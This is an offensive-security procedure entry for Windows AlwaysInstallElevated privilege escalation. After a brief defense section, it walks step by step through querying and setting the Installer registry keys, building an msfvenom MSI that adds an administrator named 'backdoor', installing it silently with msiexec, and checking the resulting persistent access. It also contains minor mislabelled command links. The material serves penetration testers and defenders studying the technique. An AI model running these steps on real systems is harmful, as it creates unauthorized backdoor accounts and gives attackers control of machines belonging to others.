---
id: e7ab4931-d61e-4807-b460-df373f67d131
name: Windows-AlwaysInstallElevated-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.773506+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse-Elevation-Control-Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
sub_techniques:
  - >-
    [[techniques/Abuse-Elevation-Control-Mechanism-Always-Install-Elevated|T1548.002
    - Abuse Elevation Control Mechanism: Bypass User Account Control]]
tags:
  - '[[tags/EoP-AlwaysInstallElevated]]'
  - '[[tags/Windows-Privilege-Escalation]]'
commands:
  - '[[commands/reg-query-alwaysinstallelevated-hkcu]]'
  - '[[commands/reg-query-alwaysinstallelevated-hklm]]'
  - '[[commands/reg-add-alwaysinstallelevated-hkcu]]'
  - '[[commands/msfvenom-create-windows-adduser-msi]]'
  - '[[commands/msfvenom-create-windows-adduser-msi-nouac]]'
  - '[[commands/msiexec-install-msi-package-silently]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Windows-AlwaysInstallElevated-Privilege-Escalation

## Summary

The AlwaysInstallElevated privilege escalation technique exploits a Windows Installer configuration that allows non-administrative users to install software with elevated privileges by setting specific registry keys. An attacker with initial low-privilege access can enable this setting in their user hive, create a malicious MSI package using tools like msfvenom to add a backdoor administrator account, and install it silently to gain persistent elevated access on the compromised Windows system.

## Description

This procedure targets the AlwaysInstallElevated registry value under HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer and HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer. If both are set to 1, any user can install MSI packages with SYSTEM privileges without prompting for elevation. Attackers typically control only HKCU, so they set it to 1 and rely on HKLM already being misconfigured (common in legacy or poorly secured environments). The malicious MSI adds a new admin user (e.g., 'backdoor' with password 'backdoor123'), enabling lateral movement and further persistence. This maps to MITRE ATT&CK T1548.002 for bypassing UAC via elevation control abuse. It requires initial foothold on a Windows host and is effective in domain environments for escalating to local admin.

## Requirements

1. Low-privilege user access to a Windows system (e.g., via initial access vector like phishing).
2. Ability to write to HKCU registry hive (standard user capability).
3. Metasploit Framework installed (for msfvenom to generate MSI payloads).
4. File system write access to create and execute the MSI (e.g., in %TEMP%).
5. HKLM\AlwaysInstallElevated ideally set to 1 (check first; if not, this technique may fail without admin rights to set it).

## Defense

- Regularly audit and monitor changes to AlwaysInstallElevated registry keys using tools like Sysmon or Windows Event Logs (Event ID 4657 for registry modifications).
- Restrict write access to Installer policy keys via Group Policy; enforce HKLM\AlwaysInstallElevated=0 and block HKCU modifications if possible.
- Implement application whitelisting with AppLocker or Windows Defender Application Control to prevent unauthorized MSI installations.
- Enable UAC with secure desktop and monitor MSIExec processes for anomalous executions (e.g., via EDR tools like CrowdStrike or Microsoft Defender).

## Objectives

1. Verify and enable AlwaysInstallElevated configuration to allow elevated MSI installs.
2. Generate a malicious MSI payload that creates a backdoor administrator account.
3. Install the MSI silently to achieve privilege escalation and persistence.
4. Validate the new elevated access for further post-exploitation activities like lateral movement.

## Instructions

### Step 1: Check Current AlwaysInstallElevated Registry Values

**Context**: Before attempting escalation, verify if the AlwaysInstallElevated keys are set to 1 in both user (HKCU) and machine (HKLM) hives. Both must be 1 for the exploit to work without admin rights; you can only set HKCU as a standard user.

**Code** ([[codes/PowerShell-Check-AlwaysInstallElevated-Registry-Keys]]):

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU:\Software\Policies\Microsoft\Windows\Installer
```

> This multi-line script uses both cmd-style reg query (executable in PowerShell) and native PowerShell cmdlets to retrieve the registry values. Run it in an elevated or standard PowerShell session. If the value is 0 or missing in either hive, the exploit won't grant elevation.

### Step 2: Enable AlwaysInstallElevated in HKCU if Necessary

**Context**: If the HKCU value is not 1, set it to enable elevated installs for your user session. This requires no admin rights but assumes HKLM is already 1 (common misconfiguration). Create the key path if it doesn't exist.

**Command** ([[commands/reg-add-alwaysinstallelevated-hkcu]]):
```cmd
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
```

> This command adds or updates the registry value to 1. Run it from cmd or PowerShell. Re-check with Step 1 to confirm.

### Step 3: Generate Malicious MSI Payload with Backdoor User

**Context**: Use msfvenom from the Metasploit Framework to create an MSI package that adds a new administrator user upon installation. This payload executes with elevated privileges due to AlwaysInstallElevated. Choose the standard MSI or nouac variant to bypass UAC prompts if needed.

**Command** ([[commands/msfvenom-create-windows-adduser-msi]]):
```bash
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
```

> Generates a standard MSI. Transfer the resulting evil.msi to the target Windows system (e.g., via SMB or initial access tool).

Alternatively, for UAC bypass:

**Command** ([[commands/msfvenom-create-windows-adduser-msi-nouac]]):
```bash
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
```

> The -nouac flag creates an MSI that avoids UAC elevation prompts. Expected output is the MSI file; no console output beyond progress.

### Step 4: Install the Malicious MSI Silently

**Context**: Execute the MSI on the target using msiexec to install the backdoor user with elevated privileges. The /quiet /qn flags suppress UI and prompts.

**Command** ([[commands/msiexec-install-msi-package-silently]]):
```cmd
msiexec /quiet /qn /i C:\evil.msi
```

> Run from cmd on the target. The installation happens silently; check for success by attempting login with the new credentials or querying user accounts.

### Step 5: Verify Escalation and Persistence

**Context**: Confirm the backdoor user was created with admin rights. Log out and log in as 'backdoor' or use it for further actions.

**Command** ([[commands/reg-query-alwaysinstallelevated-hkcu]]):
```cmd
net user backdoor
```

> Not a registry command, but use 'net user' to list the new account. Expected: Account exists with admin group membership. If successful, you now have persistent elevated access.
